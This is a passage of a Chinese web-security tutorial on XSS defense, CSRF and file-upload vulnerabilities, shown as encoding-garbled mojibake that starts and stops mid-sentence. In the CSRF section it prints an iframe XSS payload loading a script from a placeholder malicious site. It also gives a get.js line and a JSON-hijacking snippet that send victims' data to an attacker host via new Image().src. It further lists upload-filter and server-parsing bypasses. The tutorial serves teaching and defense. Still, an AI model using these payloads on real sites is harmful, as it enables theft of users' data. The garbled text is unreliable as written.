å¯¹æ•æ„Ÿå­—ç¬¦è½¬ä¹‰ã€URLå±žæ€§è¿›è¡Œç›¸åº”çš„è§„å®šç­‰ã€‚ 8ã€å°½é‡ä½¿ç”¨WAF 9ã€é˜²å¾¡DOMåž‹XSS DOMåž‹XSSä¸»è¦æ˜¯ç”±å®¢æˆ·ç«¯çš„è„šæœ¬é€šè¿‡DOMåŠ¨æ€åœ°è¾“å‡ºæ•°æ®åˆ°é¡µé¢è€Œä¸æ˜¯ä¾èµ–äºŽå°†æ•°æ®æäº¤ç»™æœåŠ¡å™¨ç«¯ï¼Œè€Œä»Žå®¢æˆ·ç«¯èŽ·å¾—DOMä¸­çš„æ•°æ®åœ¨æœ¬åœ°æ‰§è¡Œï¼Œå› è€Œä»…ä»ŽæœåŠ¡å™¨ç«¯æ˜¯æ— æ³•é˜²å¾¡çš„ã€‚å…¶é˜²å¾¡åœ¨äºŽï¼š ï¼ˆ1ï¼‰ é¿å…å®¢æˆ·ç«¯æ–‡æ¡£é‡å†™ã€é‡å®šå‘æˆ–å…¶ä»–æ•æ„Ÿæ“ä½œï¼ŒåŒæ—¶é¿å…ä½¿ç”¨å®¢æˆ·ç«¯æ•°æ®ï¼Œè¿™äº›æ“ä½œå°½é‡åœ¨æœåŠ¡å™¨ç«¯ä½¿ç”¨åŠ¨æ€é¡µé¢æ¥å®žçŽ°ï¼› ï¼ˆ2ï¼‰ åˆ†æžå’Œå¼ºåŒ–å®¢æˆ·ç«¯JSä»£ç ï¼Œç‰¹åˆ«æ˜¯å—åˆ°ç”¨æˆ·å½±å“çš„DOMå¯¹è±¡ï¼Œæ³¨æ„èƒ½ç›´æŽ¥ä¿®æ”¹DOMå’Œåˆ›å»ºHTMLæ–‡ä»¶çš„ç›¸å…³å‡½æ•°æˆ–æ–¹æ³•ï¼Œå¹¶åœ¨è¾“å‡ºå˜é‡åˆ°é¡µé¢æ—¶å…ˆè¿›è¡Œç¼–ç è½¬ä¹‰ï¼Œå¦‚è¾“å‡ºåˆ°HTMLåˆ™è¿›è¡ŒHTMLç¼–ç ã€è¾“å‡ºåˆ° 1&lt;script&gt; åˆ™è¿›è¡ŒJSç¼–ç ã€‚ CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰ä¸€ã€åŸºæœ¬æ¦‚å¿µæ¼æ´žå®šä¹‰ è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCross-Site Request Forgeryï¼ŒCSRFï¼‰æ˜¯ä¸€ç§ä½¿å·²ç™»å½•ç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ‰§è¡ŒæŸç§åŠ¨ä½œçš„æ”»å‡»ã€‚å› ä¸ºæ”»å‡»è€…çœ‹ä¸åˆ°ä¼ªé€ è¯·æ±‚çš„å“åº”ç»“æžœï¼Œæ‰€ä»¥CSRFæ”»å‡»ä¸»è¦ç”¨æ¥æ‰§è¡ŒåŠ¨ä½œï¼Œè€Œéžçªƒå–ç”¨æˆ·æ•°æ®ã€‚å½“å—å®³è€…æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·æ—¶ï¼ŒCSRFå¯ä»¥å®žçŽ°åœ¨å…¶ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è½¬ç§»ç”¨æˆ·èµ„é‡‘ã€å‘é€é‚®ä»¶ç­‰æ“ä½œï¼›ä½†æ˜¯å¦‚æžœå—å®³è€…æ˜¯ä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·æ—¶CSRFåˆ™å¯èƒ½å¨èƒåˆ°æ•´ä¸ªWebç³»ç»Ÿçš„å®‰å…¨ã€‚ æˆå›  ç”±äºŽç¨‹åºå‘˜çš„ä¸ä¸¥è°¨å¯¼è‡´Webåº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ž Webæµè§ˆå™¨å¯¹Cookieå’ŒHTTPèº«ä»½éªŒè¯ç­‰ä¼šè¯ä¿¡æ¯çš„å¤„ç†å­˜åœ¨ç¼ºé™· æ¼æ´žåˆ©ç”¨çš„å‰æ ç”¨æˆ·å·²ç»å®Œæˆèº«ä»½è®¤è¯ æ–°è¯·æ±‚çš„æäº¤ä¸éœ€è¦é‡æ–°èº«ä»½è®¤è¯æˆ–ç¡®è®¤æœºåˆ¶ æ”»å‡»è€…å¿…é¡»äº†è§£Web APPè¯·æ±‚çš„å‚æ•°æž„ ç”¨æˆ·ä¼šè¢«å¸å¼•åŽ»ç‚¹å‡»é“¾æŽ¥ CSRFä¸ŽXSSçš„åŒºåˆ«ä¸Žå…³ç³» XSSä¸»è¦åˆ©ç”¨ç”¨æˆ·å¯¹ç«™ç‚¹çš„ä¿¡ä»»ï¼Œè€ŒCSRFä¸»è¦æ˜¯åˆ©ç”¨ç«™ç‚¹å¯¹å·²çŸ¥èº«ä»½è®¤è¯çš„ä¿¡ä»»ã€‚æ¢å¥è¯è¯´ï¼ŒXSSæ˜¯ç”¨æˆ·è‡ªå·±ç‚¹å‡»é“¾æŽ¥æ¥è®¿é—®ç›¸åº”çš„ç½‘é¡µçš„ï¼Œè€ŒCSRFæ˜¯åœ¨ç”¨æˆ·å¹¶ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ¥æäº¤è¯·æ±‚çš„ã€‚å¦å¤–ï¼Œä¸¤è€…çš„äº§ç”Ÿçš„åŽŸå› ä¹Ÿä¸ä¸€æ ·ï¼ŒCSRFçš„æ˜¯å› ä¸ºé‡‡ç”¨äº†éšå¼çš„è®¤è¯æ–¹å¼ï¼Œè€ŒXSSçš„æ˜¯å› ä¸ºå¯¹ç”¨æˆ·è¾“å…¥æ²¡æœ‰è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ã€‚ ä¸¤è€…å‡åˆ©ç”¨ç”¨æˆ·çš„ä¼šè¯æ‰§è¡ŒæŸäº›æ“ä½œï¼›è‹¥ä¸€ä¸ªç«™ç‚¹å­˜åœ¨XSSæ¼æ´žï¼Œåˆ™å¾ˆå¤§å¯èƒ½ä¹Ÿå­˜åœ¨CSRFæ¼æ´žï¼›è‹¥CSRFçš„æ¶æ„ä»£ç å­˜åœ¨äºŽç¬¬ä¸‰æ–¹çš„ç«™ç‚¹ï¼Œå³ä½¿èƒ½æœ‰æ•ˆåœ°è¿‡æ»¤ç”¨æˆ·çš„è¾“å…¥è€Œé˜²æ­¢XSSï¼Œä¹Ÿæœªå¿…èƒ½é˜²å¾¡CSRFã€‚ æ”»å‡»æ–¹å¼ GETåž‹ä¸ŽPOSTåž‹CSRFï¼šä¸»è¦å–å†³äºŽç›¸åº”æ“ä½œå¯¹æäº¤æ–¹å¼çš„é™åˆ¶ï¼Œå…¶åŽŸç†éƒ½æ˜¯äº‹å…ˆæž„é€ å‡ºä¸€ä¸ªæ¶æ„çš„è¯·æ±‚ï¼Œç„¶åŽè¯±å¯¼ç”¨æˆ·ç‚¹å‡»æˆ–è®¿é—®ï¼Œä»Žè€Œå‡å€Ÿç”¨æˆ·èº«ä»½å®Œæˆç›¸åº”çš„æ“ä½œã€‚å¦å¤–ï¼Œæœ‰äº›POSTåž‹CSRFä¹Ÿå¯èƒ½ä¼šåˆ©ç”¨javascriptè¿›è¡Œè‡ªåŠ¨æäº¤è¡¨å•å®Œæˆæ“ä½œã€‚ Flashåž‹CSRFï¼šé€šå¸¸æ˜¯ç”±äºŽCrossdomain.xmlæ–‡ä»¶é…ç½®ä¸å½“é€ æˆçš„ï¼Œåˆ©ç”¨æ–¹æ³•æ˜¯ä½¿ç”¨swfæ¥å‘èµ·è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œå¦‚: Flashè·¨åŸŸæƒé™ç®¡ç†æ–‡ä»¶è®¾ç½®ä¸ºå…è®¸æ‰€æœ‰ä¸»æœº/åŸŸåè·¨åŸŸå¯¹æœ¬ç«™è¿›è¡Œè¯»å†™æ•°æ®ï¼š 1234This XML file does not appear to have any style information associated with it. The document tree is shown below.&lt;cross-domain-policy&gt; &lt;allow-access-from domain="*"/&gt;&lt;/cross-domain-policy&gt; Flashè·¨åŸŸæƒé™ç®¡ç†æ–‡ä»¶è¿‡æ»¤è§„åˆ™ä¸ä¸¥(domain=â€*â€)ï¼Œå¯¼è‡´å¯ä»¥ä»Žå…¶å®ƒä»»ä½•åŸŸä¼ Flashäº§ç”ŸCSRFã€‚ CSRFè •è™«ï¼šCSRFå¸¸è§çš„å±å®³æ˜¯æ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä»¥ç”¨æˆ·çš„èº«ä»½è¿›è¡ŒæŒ‡å®šçš„æ“ä½œï¼Œä½†å®žé™…ä¸ŠCSRFçš„å±å®³è¿œä¸æ­¢äºŽæ­¤ï¼Œç»è¿‡ç‰¹æ„æž„é€ çš„CSRFå¯ä»¥äº§ç”Ÿè •è™«çš„æ•ˆæžœã€‚å¦‚ï¼šæŸç¤¾åŒºç§ä¿¡å¥½å‹çš„æŽ¥å£å’ŒèŽ·å–å¥½å‹åˆ—è¡¨çš„æŽ¥å£éƒ½å­˜åœ¨CSRFæ¼æ´žï¼Œæ”»å‡»è€…å°±å¯ä»¥å°†å…¶ç»„åˆæˆä¸€ä¸ªCSRFè •è™«â€”â€”å½“ä¸€ä¸ªç”¨æˆ·è®¿é—®æ¶æ„é¡µé¢åŽé€šè¿‡CSRFèŽ·å–å…¶å¥½å‹åˆ—è¡¨ä¿¡æ¯ï¼Œç„¶åŽå†åˆ©ç”¨ç§ä¿¡å¥½å‹çš„CSRFæ¼æ´žç»™å…¶æ¯ä¸ªå¥½å‹å‘é€ä¸€æ¡æŒ‡å‘æ¶æ„é¡µé¢çš„ä¿¡æ¯ï¼Œåªè¦æœ‰äººæŸ¥çœ‹è¿™ä¸ªä¿¡æ¯é‡Œçš„é“¾æŽ¥ï¼ŒCSRFè •è™«å°±ä¼šä¸æ–­ä¼ æ’­ä¸‹åŽ»ï¼Œå…¶å¯èƒ½é€ æˆçš„å±å®³å’Œå½±å“éžå¸¸å·¨å¤§ï¼ äºŒã€CSRFæ”»å‡»èŽ·å–æ•°æ®çš„æ–¹æ³•è¦èŽ·å–çš„å…³é”®æ•°æ®ï¼šç”¨æˆ· idã€ç”¨æˆ·æ˜µç§°ã€ç”¨æˆ· emailã€ç”¨æˆ·ä¸ªäººé¡µé¢åœ°å€ç­‰ã€‚ åŒåŸŸå†… CSRF æ”»å‡»èŽ·å–æ•°æ®å‡ ä¹Žæ²¡ä»»ä½•é™åˆ¶ã€‚ è·¨åŸŸ CSRF æ”»å‡»èŽ·å–æ•°æ®çš„å‡ ç§æ–¹æ³•æ€»ç»“å¦‚ä¸‹ï¼š 1ã€ç»“åˆXSS ç»„åˆæ¼æ´ž åˆ©ç”¨XSS èŽ·å–æ•°æ®ï¼Œå¦‚ä¹‹å‰å…³äºŽXSSæ–‡ç« åšçš„ä¸‰æ–¹çš„æ¼”ç¤ºï¼Œä½¿ç”¨ç›®æ ‡ç«™ç‚¹ä¸Šçš„XSS æ¼æ´žï¼š 1&lt;iframe width=0 height=0 src=â€˜http://ç›®æ ‡ç«™ç‚¹/search.php?k=â€œ&gt;&lt;script src=http://æ¶æ„ç«™ç‚¹/get.js&gt;&lt;/script&gt;â€™&gt;&lt;/iframe&gt; å…¶ä¸­get.js çš„ä»£ç ä¸ºï¼š 12//use DOM method to get your datanew Image(). src=â€˜http://æ¶æ„ç«™ç‚¹/a.php?data=â€˜+data; æ¶æ„ç«™ç‚¹çš„ a.php æ–‡ä»¶æŽ¥æ”¶å”¯ä¸€æ ‡è¯†ç­‰æ•°æ®ï¼Œè¯¥å”¯ä¸€æ ‡è¯†å¯ä»¥æ˜¯ url ä¸­çš„æˆ–æ˜¯ç›®æ ‡ç«™ç‚¹url å¯¹åº”çš„å†…å®¹ä¸­çš„ã€‚è¿™æ ·å—å®³è€…å°±ä¼šè®¿é—®åˆ°ç¬¬ä¸‰æ–¹çš„æ¶æ„ç½‘ç«™ä»Žè€Œæ³„éœ²ä¿¡æ¯ã€‚ 2ã€JSON Hijacing ç›®æ ‡ç«™ç‚¹ä½¿ç”¨äº† JSON æ•°æ®ä¼ è¾“ç”¨æˆ·ç§æœ‰æ•°æ®ï¼Œå…¶ä¸­åŒ…å«éœ€è¦çš„å”¯ä¸€æ ‡è¯†ç­‰ä¿¡æ¯ã€‚ ç›¸å…³ä»£ç ï¼š 12345&lt;script&gt; function hijack(o)&#123;//use DOM method to get your datanew Image().src="http://192.168.1.2/JSONHiJack.asp?hi="+escape(data);&#125;&lt;/script&gt;&lt;script src=http://api.fanfou.com/private_messages/inbox.json?callback=hijack&amp;count=2&gt;&lt;/script&gt; 3ã€Flash AsctionScriptï¼ˆcrossdomain.xmlï¼‰ å‰ææ˜¯ç›®æ ‡ç«™ç‚¹ä¸‹å­˜åœ¨crossdomain.xmlæ–‡ä»¶ï¼Œä¸”å…¶é…ç½®å…è®¸å…¶ä»–åŸŸçš„ ASè„šæœ¬è¿›è¡Œè·¨åŸŸè¯·æ±‚ã€‚ 1234&lt;?xml version="1.0"?&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain="*" /&gt;&lt;/cross-domain-policy&gt; ç›¸å…³ä»£ç ï¼š 1234import flash.net.*; var _l = new URLLoader(new URLRequest(â€œhttp://ç›®æ ‡ç«™ç‚¹/"));_l.addEventListener(Event.COMPLETE,function()&#123;text1.text = _l.data&#125;);_l.load(); 4ã€æœåŠ¡ç«¯ä»£ç†æŠ€æœ¯ ä¸‰ã€æ£€æµ‹æ–¹æ³•æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æŠ“å–ä¸€ä¸ªæ­£å¸¸è¯·æ±‚çš„æ•°æ®åŒ…ï¼ŒåŽ»æŽ‰ Referer å­—æ®µåŽå†é‡æ–°æäº¤ï¼Œå¦‚æžœè¯¥æäº¤è¿˜æœ‰æ•ˆï¼Œé‚£ä¹ˆåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šå­˜åœ¨ CSRF æ¼æ´žã€‚å¦å¤–è¿˜éœ€è¦ç¡®è®¤æ•°æ®åŒ…ä¸­ç¡®å®žæ²¡æœ‰å«æœ‰tokenå­—æ ·ï¼Œå³ä½¿æœ‰ä¹Ÿå°è¯•åŽ»æŽ‰å†å‘åŒ…çœ‹æ˜¯å¦æ˜¯è¿›è¡Œæœ‰æ•ˆçš„CSRFæ ¡éªŒå³å¯ã€‚ ä¸€äº›ä¸“é—¨é’ˆå¯¹ CSRF æ¼æ´žè¿›è¡Œæ£€æµ‹çš„å·¥å…·ï¼Œå¦‚CSRFTesterï¼ŒCSRF Request Builder ç­‰ã€‚ ä»¥ CSRFTester å·¥å…·ä¸ºä¾‹ï¼ŒCSRF æ¼æ´žæ£€æµ‹å·¥å…·çš„æµ‹è¯•åŽŸç†å¦‚ä¸‹ï¼šä½¿ç”¨ CSRFTester è¿›è¡Œæµ‹è¯•æ—¶ï¼Œé¦–å…ˆéœ€è¦æŠ“å–æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è®¿é—®è¿‡çš„æ‰€æœ‰é“¾æŽ¥ä»¥åŠæ‰€æœ‰çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œç„¶åŽé€šè¿‡åœ¨ CSRFTester ä¸­ä¿®æ”¹ç›¸åº”çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œé‡æ–°æäº¤ï¼Œè¿™ç›¸å½“äºŽä¸€æ¬¡ä¼ªé€ å®¢æˆ·ç«¯è¯·æ±‚ã€‚å¦‚æžœä¿®æ”¹åŽçš„æµ‹è¯•è¯·æ±‚æˆåŠŸè¢«ç½‘ç«™æœåŠ¡å™¨æŽ¥å—ï¼Œåˆ™è¯´æ˜Žå­˜åœ¨CSRF æ¼æ´žï¼Œå½“ç„¶æ­¤æ¬¾å·¥å…·ä¹Ÿå¯ä»¥è¢«ç”¨æ¥è¿›è¡Œ CSRF æ”»å‡»ã€‚ å››ã€é˜²å¾¡æ–¹æ³•1ã€ æœåŠ¡ç«¯çš„é˜²å¾¡ ä¸»è¦æœ‰ 5 ç§ç­–ç•¥ï¼šéªŒè¯ HTTPçš„Refererå­—æ®µã€åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ  token å¹¶éªŒè¯ã€åœ¨ HTTP å¤´ä¸­è‡ªå®šä¹‰å±žæ€§å¹¶éªŒè¯ã€ä½¿ç”¨POSTæ›¿ä»£GETç­‰ã€‚ ï¼ˆ1ï¼‰ã€éªŒè¯ HTTPçš„Refererå­—æ®µï¼Œåœ¨ HTTP å¤´çš„Refererå­—æ®µè®°å½•äº†è¯¥ HTTP è¯·æ±‚çš„æ¥æºåœ°å€ã€‚é¡ºä¾¿è§£å†³äº†éžæ³•ç›—é“¾ã€ç«™å¤–æäº¤ç­‰é—®é¢˜ã€‚åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œè®¿é—®ä¸€ä¸ªå®‰å…¨å—é™é¡µé¢çš„è¯·æ±‚å¿…é¡»æ¥è‡ªäºŽåŒä¸€ä¸ªç½‘ç«™ã€‚ ï¼ˆ2ï¼‰ã€åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ  token å¹¶éªŒè¯ï¼Œå¯ä»¥åœ¨ HTTPè¯·æ±‚ä¸­ä»¥å‚æ•°çš„å½¢å¼åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„ tokenï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯å»ºç«‹ä¸€ä¸ªæ‹¦æˆªå™¨æ¥éªŒè¯è¿™ä¸ªtokenï¼Œå¦‚æžœè¯·æ±‚ä¸­æ²¡æœ‰ token æˆ–è€… token å†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºå¯èƒ½æ˜¯ CSRF æ”»å‡»è€Œæ‹’ç»è¯¥è¯·æ±‚ã€‚æŠµå¾¡ CSRF æ”»å‡»çš„å…³é”®åœ¨äºŽï¼šåœ¨è¯·æ±‚ä¸­åŠ å…¥æ”»å‡»è€…æ‰€ä¸èƒ½ä¼ªé€ çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è¯¥ä¿¡æ¯ä¸å­˜åœ¨äºŽ Cookie ä¹‹ä¸­ã€‚ ï¼ˆ3ï¼‰ã€åœ¨ HTTP å¤´ä¸­è‡ªå®šä¹‰å±žæ€§å¹¶éªŒè¯ï¼Œä¹Ÿæ˜¯ä½¿ç”¨ token å¹¶è¿›è¡ŒéªŒè¯ï¼Œä½†å¹¶ä¸æ˜¯æŠŠ tokenä»¥å‚æ•°çš„å½¢å¼ç½®äºŽ HTTP è¯·æ±‚è€Œæ˜¯æ”¾åˆ° HTTP å¤´ä¸­è‡ªå®šä¹‰çš„å±žæ€§é‡Œã€‚é€šè¿‡XMLHttpRequest è¿™ä¸ªç±»ï¼Œå¯ä»¥ä¸€æ¬¡æ€§ç»™æ‰€æœ‰è¯¥ç±»è¯·æ±‚åŠ ä¸Š csrftoken è¿™ä¸ª HTTP å¤´å±žæ€§ï¼Œå¹¶æŠŠtoken å€¼æ”¾å…¥å…¶ä¸­ã€‚è¿™æ ·è§£å†³äº†å‰ä¸€ç§æ–¹æ³•åœ¨è¯·æ±‚ä¸­åŠ å…¥ token çš„ä¸ä¾¿ï¼ŒåŒæ—¶ï¼Œé€šè¿‡è¿™ä¸ªç±»è¯·æ±‚çš„åœ°å€ä¸ä¼šè¢«è®°å½•åˆ°æµè§ˆå™¨çš„åœ°å€æ ï¼Œä¹Ÿä¸ç”¨æ‹…å¿ƒ token ä¼šé€šè¿‡ Referer æ³„éœ²åˆ°å…¶ä»–ç½‘ç«™ã€‚ ï¼ˆ4ï¼‰ã€ä¸¥æ ¼åŒºåˆ†å¥½ POST ä¸Ž GET çš„æ•°æ®è¯·æ±‚ï¼Œå°½é‡ä½¿ç”¨POSTæ¥æ›¿ä»£GETï¼Œå¦‚åœ¨ asp ä¸­ä¸è¦ä½¿ç”¨ Request æ¥ç›´æŽ¥èŽ·å–æ•°æ®ã€‚åŒæ—¶å»ºè®®ä¸è¦ç”¨ GET è¯·æ±‚æ¥æ‰§è¡ŒæŒä¹…æ€§æ“ä½œã€‚ ï¼ˆ5ï¼‰ã€ä½¿ç”¨éªŒè¯ç æˆ–è€…å¯†ç ç¡®è®¤æ–¹å¼ï¼Œç¼ºç‚¹æ˜¯ç”¨æˆ·ä½“éªŒå·®ã€‚ 2ã€ ç”¨æˆ·ç«¯çš„é˜²å¾¡ ç”¨æˆ·çš„å®‰å…¨æ„è¯†ä¸Žè‰¯å¥½çš„ä¸Šç½‘ä¹ æƒ¯ã€‚ 3ã€ å®‰å…¨è®¾å¤‡çš„é˜²å¾¡ æœ‰äº›åŽ‚å•†çš„å®‰å…¨äº§å“èƒ½åŸºäºŽç¡¬ä»¶å±‚é¢å¯¹HTTP å¤´éƒ¨çš„ Referer å­—æ®µå†…å®¹è¿›è¡Œæ£€æŸ¥æ¥å¿«é€Ÿå‡†ç¡®çš„è¯†åˆ« CSRF æ”»å‡»ã€‚ æ–‡ä»¶ä¸Šä¼ æ¼æ´žä¸€ã€åŸºæœ¬æ¦‚å¿µæ¼æ´žå®šä¹‰ æ–‡ä»¶ä¸Šä¼ æ¼æ´žæ˜¯æŒ‡ç”±äºŽæœåŠ¡å™¨ç«¯å¯¹äºŽç”¨æˆ·ä¸Šä¼ éƒ¨åˆ†çš„æŽ§åˆ¶ä¸ä¸¥æ ¼å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ¶æ„çš„æ–‡ä»¶åˆ°æœåŠ¡å™¨ã€‚ç®€å•ç‚¹è¯´ï¼Œå°±æ˜¯ç”¨æˆ·ç›´æŽ¥æˆ–è€…é€šè¿‡å„ç§ç»•è¿‡æ–¹å¼å°†WebShellä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸­è¿›è€Œæ‰§è¡Œåˆ©ç”¨ã€‚ æˆå›  å¯¼è‡´æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´žçš„åŽŸå› è¾ƒå¤šï¼Œä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å‡ ç±»ï¼š æœåŠ¡å™¨é…ç½®ä¸å½“ å¼€æºç¼–è¾‘å™¨ä¸Šä¼ æ¼æ´ž æœ¬åœ°æ–‡ä»¶ä¸Šä¼ é™åˆ¶è¢«ç»•è¿‡ è¿‡æ»¤ä¸ä¸¥æˆ–è¢«ç»•è¿‡ æ–‡ä»¶è§£æžæ¼æ´žå¯¼è‡´æ–‡ä»¶æ‰§è¡Œ æ–‡ä»¶è·¯å¾„æˆªæ–­ æœåŠ¡å™¨é…ç½®ä¸å½“ äºŒã€æ–‡ä»¶ä¸Šä¼ æ”»å‡»åˆ†ç±»1ã€è½»é‡çº§æ£€æµ‹ç»•è¿‡æ”»å‡» ï¼ˆ1ï¼‰ç»•è¿‡javascript å¯¹æ‰©å±•åçš„æ£€æµ‹ï¼š ä½¿ç”¨Burpsuiteç­‰åå‘ä»£ç†å·¥å…·ç›´æŽ¥POSTæ•°æ®åŒ…åˆ°æœåŠ¡ç«¯ï¼Œç»•è¿‡å‰ç«¯æ£€æµ‹ï¼Œå¦‚DVWAä¸­çš„ç»•è¿‡ç¤ºä¾‹ã€‚ ï¼ˆ2ï¼‰ç»•è¿‡æœåŠ¡ç«¯å¯¹http request åŒ…MIME ç±»åž‹æ£€æµ‹ï¼š ä½¿ç”¨Burpsuiteç­‰åå‘ä»£ç†å·¥å…·ä¼ªé€ POST æ•°æ®åŒ…åˆ°æœåŠ¡ç«¯ï¼Œç»•è¿‡MIMEæ£€æµ‹ï¼Œå¦‚DVWAä¸­çš„ç»•è¿‡ç¤ºä¾‹ã€‚ 2ã€æ–‡ä»¶å†…å®¹æ£€æµ‹ç»•è¿‡æ”»å‡» æ–‡ä»¶åŠ è½½æµ‹è¯•ç»•è¿‡ï¼šå¯¹æ–‡ä»¶è¿›è¡Œä»£ç æ³¨å…¥å†é…åˆä»»æ„è§£æžè°ƒç”¨/æ¼æ´žã€‚ 3ã€ä¸Šä¼ æ”»å‡»æ¡†æž¶æ¼æ´žåˆ†å±‚ä»¥åŠè·¯å¾„/æ‰©å±•åæ£€æµ‹ç»•è¿‡æ”»å‡» è½»é‡çº§æ£€æµ‹ç»•è¿‡æ”»å‡» ç»•è¿‡javascript å¯¹æ‰©å±•åçš„æ£€æµ‹ ä»£ç å±‚æ¼æ´ž ç»•è¿‡æœåŠ¡ç«¯å¯¹http request åŒ…MIME ç±»åž‹æ£€æµ‹ ä»£ç å±‚æ¼æ´ž è·¯å¾„ã€æ‰©å±•åæ£€æµ‹ç»•è¿‡æ”»å‡» é»‘åå•ç»•è¿‡ ç™½åå•ç»•è¿‡ æ–‡ä»¶åå¤§å°å†™ç»•è¿‡åå•åˆ—è¡¨ç»•è¿‡ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡0x00æˆªæ–­ç»•è¿‡.htaccessæ–‡ä»¶æ”»å‡»PHPæ–‡ä»¶åŒ…å«æ¼æ´žApacheè§£æžæ¼æ´žIISè§£æžæ¼æ´žNginxè§£æžæ¼æ´ž ä»£ç å±‚æ¼æ´žä»£ç å±‚æ¼æ´žä»£ç å±‚æ¼æ´žä»£ç å±‚æ¼æ´žä»£ç å±‚æ¼æ´žä»£ç å±‚æ¼æ´žåº”ç”¨å±‚æ¼æ´žåº”ç”¨å±‚æ¼æ´žåº”ç”¨å±‚æ¼æ´ž 0x00æˆªæ–­ç»•è¿‡PHPæ–‡ä»¶åŒ…å«æ¼æ´žIISè§£æžæ¼æ´žNginxè§£æžæ¼æ´ž ä»£ç å±‚æ¼æ´žä»£ç å±‚æ¼æ´žåº”ç”¨å±‚æ¼æ´žåº”ç”¨å±‚æ¼æ´ž 4ã€æ–‡ä»¶å†…å®¹æ£€æµ‹ç»•è¿‡æ”»å‡» æ–‡ä»¶åŠ è½½ç»•è¿‡ (ä»£ç å±‚æ¼æ´ž) æ”»å‡»æ‰‹æ³•ä¸ŽçŽ¯èŠ‚å¦‚å›¾ï¼š ä¸‰ã€ä¸Šä¼ æ–‡ä»¶ä¸­çš„è§£æžæ”»å‡»1ã€ç›´æŽ¥è§£æžï¼ˆå‡ ä¹Žæ²¡æœ‰é˜²å¾¡ï¼‰ æ¯”å¦‚ç›´æŽ¥ä¸Šä¼ ä¸€ä¸ªæ‰©å±•åæ˜¯.php çš„æ–‡ä»¶ï¼Œåªéœ€è¦ç®€å•åœ°ç»•è¿‡å®¢æˆ·ç«¯javascript æ£€æµ‹æˆ–è€…æœåŠ¡ç«¯MIME ç±»åž‹æ£€æµ‹å°±è¡Œäº†ã€‚ 2ã€é…åˆè§£æž(æœ‰ä¸€å®šç¨‹åº¦çš„é˜²å¾¡) å¯ä»¥ç†è§£ä¸ºå…ˆå°†ä»£ç æ³¨å…¥åˆ°æœåŠ¡å™¨ä¸Šï¼Œä¸Šä¼ ä¸€ä¸ªå¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„å›¾ç‰‡æˆ–æ–‡ä»¶ï¼Œç­‰å¾…ä¸€ä¸ªè§£æžçš„é…åˆæ¥å®žçŽ°æ”»å‡»ã€‚ (1)ã€æœ¬åœ°æ–‡ä»¶åŒ…å«è§£æžï¼šä¸»è¦æ˜¯PHPæœ¬åœ°æ–‡ä»¶åŒ…å« (2)ã€.htaccessæ–‡ä»¶è§£æž (3)ã€Webåº”ç”¨ç¨‹åºè§£æžæ¼æ´žä»¥åŠå…¶åŽŸç†ï¼š 1.Apache è§£æžæ¼æ´žï¼š è§£æžï¼š test.php.abcï¼ˆå…¶ä¸­abcä¸ºä»»æ„ä¸å±žäºŽé»‘åå•ä¸”ä¹Ÿä¸å±žäºŽApacheè§£æžç™½åå•çš„åç§°ï¼‰ æè¿°ï¼šä¸€ä¸ªæ–‡ä»¶åä¸ºx1.x2.x3çš„æ–‡ä»¶ï¼ŒApache ä¼šä»Žx3çš„ä½ç½®å¾€x1çš„ä½ç½®å¼€å§‹å°è¯•è§£æžï¼Œå¦‚æžœx3ä¸å±žäºŽApacheèƒ½è§£æžçš„æ‰©å±•åï¼Œé‚£ä¹ˆApacheä¼šå°è¯•åŽ»è§£æžx2çš„ä½ç½®ï¼Œè¿™æ · ä¸€ç›´å¾€å‰å°è¯•ï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ªèƒ½è§£æžçš„æ‰©å±•åä¸ºæ­¢ã€‚ 2.IIS è§£æžæ¼æ´žï¼š è§£æžï¼štest.asp/abc æˆ– test.asp;abc å æˆ– abc/def.php ï¼ˆå…¶ä¸­abcã€deféƒ½ä¸ºä»»æ„æ–‡ä»¶åï¼‰ æè¿°ï¼šIIS6.0åœ¨è§£æžaspæ ¼å¼çš„æ—¶å€™æœ‰ä¸¤ä¸ªè§£æžæ¼æ´žï¼Œä¸€ä¸ªæ˜¯å¦‚æžœç›®å½•ååŒ…å«â€.aspâ€å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆè¿™ä¸ªç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶éƒ½ä¼šæŒ‰ç…§aspåŽ»è§£æžï¼Œå¦ä¸€ä¸ªæ˜¯åªè¦æ–‡ä»¶åä¸­å«æœ‰â€.asp;â€ä¼šä¼˜å…ˆæŒ‰aspæ¥è§£æžï¼›IIS7.0/7.5æ˜¯å¯¹phpè§£æžæ—¶æœ‰ä¸€ä¸ªç±»ä¼¼äºŽNginxçš„è§£æžæ¼æ´žï¼Œå¯¹ä»»æ„æ–‡ä»¶ååªè¦åœ¨URL åŽé¢è¿½åŠ 